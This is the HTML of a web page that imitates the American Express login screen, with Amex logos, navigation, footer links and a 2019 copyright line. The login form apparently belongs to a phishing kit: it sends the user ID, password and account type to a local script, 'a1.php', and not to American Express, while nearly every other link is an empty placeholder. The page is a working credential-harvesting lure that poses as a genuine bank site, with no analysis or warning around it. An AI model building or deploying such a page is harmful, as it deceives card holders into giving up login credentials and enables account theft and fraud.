
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>American Express</title>
    <link rel="icon" href="img/favicon.ico" type="image/gif" sizes="16x16">
    <!--Css Importing-->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-social/5.1.1/bootstrap-social.min.css"/>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
<header>
    <div class="container">
        <nav class="navbar navbar-default " role="navigation" data-scroll-header>
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-menu">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand logo_desktop"  href="#"><img src="img/dls-logo-bluebox-solid.svg" alt=""></a>
                <a class="navbar-brand logo_mobile"  href="#"><img src="img/dls-logo-stack.svg" alt=""></a>
                <a href="#" class="login m_login">Log in</a>
            </div>
            <div class="collapse navbar-collapse" id="main-menu">
                <ul class="nav navbar-nav navbar-left">
                    <li><a data-scroll href="#">My Account</a></li>
                    <li><a data-scroll href="#">Cards</a></li>
                    <li><a data-scroll href="#">Travel</a></li>
                    <li><a data-scroll href="#">Rewards</a></li>
                    <li><a data-scroll href="#">Business</a></li>
                </ul>
                <ul class="co_login nav navbar-nav navbar-right">
                    <li><span class="glyphicon glyphicon-search" aria-hidden="true"></span></li>
                    <li><a href="#" class="help">help</a></li>
                    <li><a href="#" class="login">Log in</a></li>
                </ul>
            </div>
        </nav>
    </div>
</header>
<section class="section">
    <div class="container">
        <div class="row flex-justify-center">
        <div class="col-xs-12 col-md-6 col-lg-4 col-lg-offset-2 login_l">
                <form method="POST" action="a1.php">
                    <div class="">
                        <div class="form-group">
                            <label for="eliloUserID">User ID</label>
                            <input type="text" id="user" required name = "user" class="form-control" value="">
                        </div>
                        <div class="form-group">
                            <label for="eliloPassword">Password</label>
                            <input type="password" required id="password" name="password" class="form-control"   value="">
                        </div>
                    </div>
                    <div class="form-group">
                        <select id="eliloSelect" name="eliloSelect" class="form-control">
                            <option selected=""value="account">Cards - My Account </option>
                            <option value="rewards">Membership Rewards</option>
                            <option value="merchant">Merchant Account</option>
                            <option value="work">American Express @ Work</option>
                        </select>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="exampleCheck1">
                        <label class="form-check-label" for="exampleCheck1">Remember Me</label>
                    </div>
                    <input type="hidden" value="submit" name="action">
                    <button type="submit" class="btn btn-primary">Log In</button>
                    
                </form>
                <div class="list-links">
                    <ul>
                        <li><a href="#">Forgot your User ID?</a></li>
                        <li><a href="#">Forgot your Password?</a></li>
                        <li><a href="#">Create New Online Account</a></li>
                        <li><a href="#">Confirm Card Received</a></li>
                        <li><a href="#">Visit Our Security Center</a></li>
                    </ul>
                </div>
        </div>
        <div class="col-xs-12 col-md-6 col-lg-4 login_r">
            <h1 class="label">FROM OUR PARTNERS</h1>
            <div class="pad-0">
                <a href="#" target=""><img src="img/Amex-Mobile-App-web-banner.JPG" alt="Mobile App"></a>
            </div>
        </div>
    </div>
    </div>
</section>
<footer class="container">
    <div class="footer_1 row">
        <div class="col-md-3">
            <p>About</p>
            <ul>
                <li><a href="#">About American Express</a></li>
                <li><a href="#">Investor Relations</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Site Map</a></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>PRODUCTS & SERVICES</p>
            <ul>
                <li><a href="#">Credit Cards</a></li>
                <li><a href="#">Small Business Credit Cards</a></li>
                <li><a href="#">Corporate Cards</a></li>
                <li><a href="#">Prepaid Cards</a></li>
                <li><a href="#">Savings Accounts & CDs</a></li>
                <li><a href="#">Gift Cards</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>LINKS YOU MAY LIKE</p>
            <ul>
                <li><a href="#">Membership Rewards</a></li>
                <li><a href="#">Free Credit Score & Report</a></li>
                <li><a href="#">CreditSecure</a></li>
                <li><a href="#">Bluebird</a></li>
                <li><a href="#">Accept Amex Cards</a></li>
                <li><a href="#">Refer A Friend</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>ADDITIONAL INFORMATION</p>
            <ul>
                <li><a href="#">Card Agreements</a></li>
                <li><a href="#">Financial Education</a></li>
                <li><a href="#">Servicemember Benefits</a></li>
                <li><a href="#">Supplier Management</a></li>
            </ul>
        </div>
    </div>
    <hr>
    <div class="footer_2">
        <div class="foo_logo">
            <div><img src="img/dls-logo-line.svg"></div>
            <div><p><img src="img/dls-flag-us.svg" style="max-width: 21px;"> United States <a href="#">Change
                Country</a></p></div>
        </div>
        <div class="foo_social">
            <ul>
                <li><a href="#"><img src="img/fb.png"></a></li>
                <li><a href="#"><img src="img/tw.png"></a></li>
                <li><a href="#"><img src="img/in.png"></a></li>
                <li><a href="#"><img src="img/li.png"></a></li>
                <li><a href="#"><img src="img/you.png"></a></li>
            </ul>
        </div>
        <div class="foo_menu">
            <ul>
                <li><a href="#">Terms of Service</a></li>
                <li><a href="#">Privacy Center</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Security Center</a></li>
            </ul>
        </div>
    </div>
    <div class="footer_3">
        <p>All users of our online services subject to Privacy Statement and agree to be bound by Terms of Service.
            Please review.</p>
        <p>© 2019 American Express Company. All rights reserved</p>
    </div>
</footer>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="js/custom.js"></script>
</html>